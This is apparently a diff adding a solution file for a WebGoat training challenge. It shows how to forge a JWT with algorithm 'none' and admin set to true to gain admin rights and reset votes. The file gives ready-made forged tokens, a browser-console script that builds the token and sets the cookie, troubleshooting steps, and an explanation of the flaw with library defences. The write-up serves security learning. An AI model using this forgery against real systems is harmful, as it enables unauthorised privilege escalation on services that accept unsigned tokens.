@@ -1,0 +1,249 @@
+================================================================================
+  ⭐ PROVEN WORKING SOLUTION ⭐
+  Challenge 1: "Become Admin & Reset Votes"
+================================================================================
+
+TESTED AND WORKING - December 2025
+
+THE KEY INSIGHT:
+- Cookie is HttpOnly (JavaScript cannot access it)
+- Must use algorithm "none" attack
+- Must edit cookie manually in DevTools Application tab
+
+================================================================================
+  STEP-BY-STEP SOLUTION (EXACT WORKING METHOD)
+================================================================================
+
+Step 1: Get Your Current JWT Token from DevTools
+-------------------------------------------------
+1. Open WebGoat Challenge 1 page
+2. Press F12 (DevTools)
+3. Click "Application" tab
+4. Left sidebar: Cookies > http://192.168.254.112:8001
+5. Find cookie named: "access_token"
+6. Triple-click the VALUE to select all
+7. Copy (Ctrl+C)
+
+Example token you'll see:
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.xSkj4A15TtrWN7U1TfwNYDMKzmEnUq32vky6IOgjletmX42Ed28RQjVGaLTAVFT43W-1e3Joy0As5lN74SyWUA
+
+Step 2: Generate Attack Token
+------------------------------
+YOUR ATTACK TOKEN (ready to use):
+
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+
+This token has:
+✓ Algorithm: "none" (not "HS512")
+✓ Admin: "true" (not "false")
+✓ No signature (ends with dot)
+
+Step 3: Replace Cookie Value in DevTools
+-----------------------------------------
+1. Still in DevTools > Application > Cookies
+2. Find the "access_token" row
+3. Double-click the VALUE column (not the Name)
+4. Press Ctrl+A to select all
+5. Press Delete to clear
+6. Paste the attack token: eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+7. Press Enter
+
+Step 4: Complete the Challenge
+-------------------------------
+Click "Delete" button next to any user (Tom, Jerry, Sylvester)
+OR
+Refresh the page (F5)
+
+✅ CHALLENGE COMPLETE!
+
+================================================================================
+  WHY THIS WORKS
+================================================================================
+
+Your token looks like this:
+eyJhbGciOiJIUzUxMiJ9.PAYLOAD.SIGNATURE
+
+Part 1: Header (base64url encoded)
+{"alg":"HS512"}
+
+Part 2: Payload (base64url encoded)
+{"iat":1766558919,"admin":"false","user":"Tom"}
+
+Part 3: Signature (HMAC-SHA512)
+Aw9FmcrOr7Amea...
+
+ATTACK: Change to Algorithm "none"
+-----------------------------------
+
+New Header:
+{"alg":"none"}
+Base64url encode: eyJhbGciOiJub25lIn0
+
+New Payload (admin=true):
+{"iat":1766558919,"admin":"true","user":"Tom"}
+Base64url encode: eyJpYXQiOjE3NjY1NTg5MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ
+
+New Token (NO signature):
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NTg5MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+
+Note: Token ends with a dot (.) and NO signature!
+
+Replace access_token cookie with this token.
+
+================================================================================
+  SOLUTION METHOD 3: BROWSER CONSOLE (QUICK)
+================================================================================
+
+Open Browser Console (F12 > Console) and paste:
+
+// Your original token
+const originalToken = "YOUR_TOKEN_HERE";
+
+// Decode
+const [header, payload, sig] = originalToken.split('.');
+
+// Decode payload
+const decodedPayload = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+console.log("Original payload:", decodedPayload);
+
+// Change admin to true
+decodedPayload.admin = "true";  // or true without quotes
+
+// New header with algorithm "none"
+const newHeader = btoa('{"alg":"none"}').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+
+// Encode new payload
+const newPayload = btoa(JSON.stringify(decodedPayload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+
+// New token (no signature)
+const attackToken = newHeader + '.' + newPayload + '.';
+
+console.log("Attack token:", attackToken);
+
+// Set cookie
+document.cookie = `access_token=${attackToken}; path=/`;
+
+// Now click "Reset Votes" button or refresh page
+
+================================================================================
+  WHY THIS WORKS
+================================================================================
+
+VULNERABILITY: Algorithm Confusion / "none" Algorithm Attack
+
+Normal JWT validation:
+1. Check algorithm in header
+2. Use corresponding secret/key to verify signature
+3. If signature valid, trust the payload
+
+ATTACK: Algorithm "none"
+1. Change algorithm to "none" in header
+2. Remove signature
+3. Server sees algorithm="none" and SKIPS signature verification
+4. Server trusts the tampered payload!
+
+This is why JWT libraries should:
+- NEVER accept algorithm "none" by default
+- Explicitly specify allowed algorithms
+- Reject tokens with unexpected algorithms
+
+================================================================================
+  TROUBLESHOOTING
+================================================================================
+
+Problem: Token still rejected
+Solution: Make sure token ends with a DOT: "...payload."
+         Not: "...payload" (no dot at end)
+
+Problem: Admin still false
+Solution: Check payload format:
+         - "admin": "true" (string)
+         - OR "admin": true (boolean)
+         Try both!
+
+Problem: Can't find access_token cookie
+Solution: Make sure you're looking at the right domain
+         http://192.168.254.112:8001 (not localhost)
+
+Problem: Reset button doesn't work
+Solution: Try refreshing the page after changing cookie
+         OR try clicking different user first, then reset
+
+================================================================================
+  VERIFICATION
+================================================================================
+
+After replacing the cookie, verify it worked:
+
+Console command:
+document.cookie.split(';').find(c => c.includes('access_token'))
+
+Should show your new token with algorithm "none"
+
+Decode it to verify:
+const token = document.cookie.split('access_token=')[1].split(';')[0];
+const payload = token.split('.')[1];
+const decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+console.log(decoded);
+
+Should show: admin: "true" or admin: true
+
+================================================================================
+  QUICK REFERENCE
+================================================================================
+
+PowerShell (EASIEST):
+1. Get token from DevTools > Cookies > access_token
+2. In PowerShell: Press 6
+3. Paste token
+4. Copy result
+5. Paste into access_token cookie
+6. Click "Reset Votes"
+
+Browser Console (FAST):
+1. Copy script from METHOD 3 above
+2. Replace YOUR_TOKEN_HERE with actual token
+3. Paste into console
+4. Press Enter
+5. Click "Reset Votes"
+
+Manual (LEARNING):
+1. Decode token parts
+2. Change header: {"alg":"none"}
+3. Change payload: "admin":"true"
+4. Base64url encode both
+5. Join with dot: header.payload.
+6. Replace cookie
+7. Click "Reset Votes"
+
+================================================================================
+  WHAT YOU SHOULD SEE
+================================================================================
+
+BEFORE:
+- User: Tom
+- Admin: false
+- Vote count: varies
+- Cannot reset votes (or button doesn't work)
+
+AFTER (with algorithm "none" token):
+- User: Tom
+- Admin: true
+- Vote count: resets to 0
+- Reset button works!
+
+Challenge will show: ✓ Completed or similar success message
+
+================================================================================
+  READY TO GO!
+================================================================================
+
+Use PowerShell Option 6 RIGHT NOW:
+1. Your script is already running
+2. Just press: 6
+3. Paste your access_token value
+4. Replace cookie with result
+5. Done! ✓
+
+The hints told you EXACTLY what to do: "Submit the token by changing the 
+algorithm to None and remove the signature" - that's PowerShell Option 6!
